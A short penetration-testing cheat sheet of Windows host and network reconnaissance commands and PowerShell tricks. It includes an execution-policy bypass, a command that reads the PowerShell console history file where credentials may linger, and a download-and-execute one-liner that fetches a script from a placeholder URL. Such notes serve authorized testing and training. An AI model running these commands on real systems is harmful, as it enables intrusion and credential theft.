## Env Commands For Host & Network Recon
```shell-session
hostname
[System.Environment]::OSVersion.Version
wmic qfe get Cpation,Description,HotFixID,InstalledOn
ipconfig /all
set
echo %USERDOMAIN%
echo %logonserver%
```
OR
```shell-session
systeminfo
```

## Harnessing PowerShell
```shell-session
Get-Module
Get-ExecutionPolicy -List
Set-ExecutionPolicy Bypass -Scope Process
Get-ChildItem Env: | ft Key,Value
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"
```
